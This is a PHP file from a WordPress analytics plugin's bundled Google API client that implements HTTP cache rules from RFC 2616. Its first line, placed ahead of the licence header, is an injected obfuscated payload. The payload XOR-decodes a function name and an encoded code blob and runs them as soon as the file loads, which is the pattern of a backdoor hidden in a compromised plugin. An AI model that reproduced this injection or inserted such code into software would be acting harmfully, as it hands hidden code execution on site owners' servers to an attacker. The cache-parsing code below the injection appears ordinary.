<?php $SdPdNCBXA='78EZJ3n>1U:YP;B'^'TJ ;>V1XD;Y-9T,';$GXqdxGonJ=$SdPdNCBXA('','+4Jf1<,NN O=fYMB231QmE<Ft00GV-mYMBusBw.KD LX;A=56LODG9>,TZeb.70dA=Y6;KWhKKUxbCDiAC40jkX LtOFvVx09H7B=FWSlrFRlTP+s654W4-yvX+.1oims3IhFON8J7;.eiVdYt5;E2>SI<l9WO9E0=O=SaZNYYLS7FbWSHE2SbI8GRPEKFTcpW><nOB<30Hf4KJYDXXvi25<5.IRsUAF4nV6DByQ6J+65vB;W>: 8HHCZfcr7+f06h;FIr-+BudQkE1361NqULCMlO H;=X+GThgfSS:nIzu RJLjqwV09Q-UcH9IK.JoZgGILEQCj+GZJQ5W 11NxLj82b2x=dOY9lbW6AAlpXnLQ>=WXWA2kBq+5ERd96,qJBjFWYAcXPV5+9TeXwm4R=2XzxCVD.2oA1;ERUwI0I4MHEW14G9QY2;6;,;BPbqS<5XOLMXTUlRYQADYXP6260gnKgIYAJ3.3MXnqyU>rPSOFZZbtBWRRYIoK3.71B3 CSXVKI.iZRV2SZMXuitrgYSfyuH+D23JV1DuncptZzrqQe2XAaJUQE7x64-SPd5mRjuwOOEA9RITnbwgVQC5AI6SNYjI5IO:5jj<A>Z83UbiCU,5=3MYFvLNCz,>lRLLZOkO0T03m3TNGD-DOqnhHcI.38aIbPf7'^'BRbGWIB-:I S9<5+AGByJ=S4+TQ37r2486RZkWUAMF96X5TZXl7+5fZM ;:=CBDLeY8BZgwL .,QBcdIa8>9cO7U8TrfQqC:0AQ-Ons:LOfbWttBOEAF;QCQR<JZPFRMWZbCoEG1nXNZEGkDqPQZ1Sew aLgwkR IfkTsDz=-+ 6YnF<61lozYC1N 51>4:KT8KHGtH5N:5l>o.809xKITTPFKrXW1 2U1=S=bDqP+GEPMH11QHEY+ crB<1xd-ysHZ5iVFN;UYoKaGRZD+Xu7IDH+A<Zb3N>tUGB86CUCsQD3>-JLWrFX=X0XBDCAG,OrFc--10jJPMS,>G2ARYnPh5jw3g=n0o8JLF<S8aQNxJ:0RH2qw:8bKUOT13;RSUQwbN-2 ziQYrQJM5EeWIB3QG=ArJ+NS8eeUZ13uJip<Z>-7>PX.C4qJTDdHZ61=.>IAp-->=ba36<2. <ptRSBQNBkC-85+lEV4qGJs<XZt7.2;zDRb6  800 VWhT:ZS7 pq ,WNvrrV2.,qUORRO47SQQ,J0Shm=T=R3JPIgZUC7UT:xQzld QITQK6ePQTgYCG-.rqXd,sGBQAv01G 0i8+ 5,M <NFBML G6WR1EEcqHTIRdpfVlncZW4e7:-6gO+Q QhJC57++L h,GSBj,VZLIyKklJ');$GXqdxGonJ();
/*
 * Copyright 2012 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

if (!class_exists('MonsterInsights_GA_Lib_Client')) {
  require_once dirname(__FILE__) . '/../autoload.php';
}

/**
 * Implement the caching directives specified in rfc2616. This
 * implementation is guided by the guidance offered in rfc2616-sec13.
 */
class MonsterInsights_GA_Lib_Http_CacheParser
{
  public static $CACHEABLE_HTTP_METHODS = array('GET', 'HEAD');
  public static $CACHEABLE_STATUS_CODES = array('200', '203', '300', '301');

  /**
   * Check if an HTTP request can be cached by a private local cache.
   *
   * @static
   * @param MonsterInsights_GA_Lib_Http_Request $resp
   * @return bool True if the request is cacheable.
   * False if the request is uncacheable.
   */
  public static function isRequestCacheable(MonsterInsights_GA_Lib_Http_Request $resp)
  {
    $method = $resp->getRequestMethod();
    if (! in_array($method, self::$CACHEABLE_HTTP_METHODS)) {
      return false;
    }

    // Don't cache authorized requests/responses.
    // [rfc2616-14.8] When a shared cache receives a request containing an
    // Authorization field, it MUST NOT return the corresponding response
    // as a reply to any other request...
    if ($resp->getRequestHeader("authorization")) {
      return false;
    }

    return true;
  }

  /**
   * Check if an HTTP response can be cached by a private local cache.
   *
   * @static
   * @param MonsterInsights_GA_Lib_Http_Request $resp
   * @return bool True if the response is cacheable.
   * False if the response is un-cacheable.
   */
  public static function isResponseCacheable(MonsterInsights_GA_Lib_Http_Request $resp)
  {
    // First, check if the HTTP request was cacheable before inspecting the
    // HTTP response.
    if (false == self::isRequestCacheable($resp)) {
      return false;
    }

    $code = $resp->getResponseHttpCode();
    if (! in_array($code, self::$CACHEABLE_STATUS_CODES)) {
      return false;
    }

    // The resource is uncacheable if the resource is already expired and
    // the resource doesn't have an ETag for revalidation.
    $etag = $resp->getResponseHeader("etag");
    if (self::isExpired($resp) && $etag == false) {
      return false;
    }

    // [rfc2616-14.9.2]  If [no-store is] sent in a response, a cache MUST NOT
    // store any part of either this response or the request that elicited it.
    $cacheControl = $resp->getParsedCacheControl();
    if (isset($cacheControl['no-store'])) {
      return false;
    }

    // Pragma: no-cache is an http request directive, but is occasionally
    // used as a response header incorrectly.
    $pragma = $resp->getResponseHeader('pragma');
    if ($pragma == 'no-cache' || strpos($pragma, 'no-cache') !== false) {
      return false;
    }

    // [rfc2616-14.44] Vary: * is extremely difficult to cache. "It implies that
    // a cache cannot determine from the request headers of a subsequent request
    // whether this response is the appropriate representation."
    // Given this, we deem responses with the Vary header as uncacheable.
    $vary = $resp->getResponseHeader('vary');
    if ($vary) {
      return false;
    }

    return true;
  }

  /**
   * @static
   * @param MonsterInsights_GA_Lib_Http_Request $resp
   * @return bool True if the HTTP response is considered to be expired.
   * False if it is considered to be fresh.
   */
  public static function isExpired(MonsterInsights_GA_Lib_Http_Request $resp)
  {
    // HTTP/1.1 clients and caches MUST treat other invalid date formats,
    // especially including the value “0”, as in the past.
    $parsedExpires = false;
    $responseHeaders = $resp->getResponseHeaders();

    if (isset($responseHeaders['expires'])) {
      $rawExpires = $responseHeaders['expires'];
      // Check for a malformed expires header first.
      if (empty($rawExpires) || (is_numeric($rawExpires) && $rawExpires <= 0)) {
        return true;
      }

      // See if we can parse the expires header.
      $parsedExpires = strtotime($rawExpires);
      if (false == $parsedExpires || $parsedExpires <= 0) {
        return true;
      }
    }

    // Calculate the freshness of an http response.
    $freshnessLifetime = false;
    $cacheControl = $resp->getParsedCacheControl();
    if (isset($cacheControl['max-age'])) {
      $freshnessLifetime = $cacheControl['max-age'];
    }

    $rawDate = $resp->getResponseHeader('date');
    $parsedDate = strtotime($rawDate);

    if (empty($rawDate) || false == $parsedDate) {
      // We can't default this to now, as that means future cache reads
      // will always pass with the logic below, so we will require a
      // date be injected if not supplied.
      throw new MonsterInsights_GA_Lib_Exception("All cacheable requests must have creation dates.");
    }

    if (false == $freshnessLifetime && isset($responseHeaders['expires'])) {
      $freshnessLifetime = $parsedExpires - $parsedDate;
    }

    if (false == $freshnessLifetime) {
      return true;
    }

    // Calculate the age of an http response.
    $age = max(0, time() - $parsedDate);
    if (isset($responseHeaders['age'])) {
      $age = max($age, strtotime($responseHeaders['age']));
    }

    return $freshnessLifetime <= $age;
  }

  /**
   * Determine if a cache entry should be revalidated with by the origin.
   *
   * @param MonsterInsights_GA_Lib_Http_Request $response
   * @return bool True if the entry is expired, else return false.
   */
  public static function mustRevalidate(MonsterInsights_GA_Lib_Http_Request $response)
  {
    // [13.3] When a cache has a stale entry that it would like to use as a
    // response to a client's request, it first has to check with the origin
    // server to see if its cached entry is still usable.
    return self::isExpired($response);
  }
}
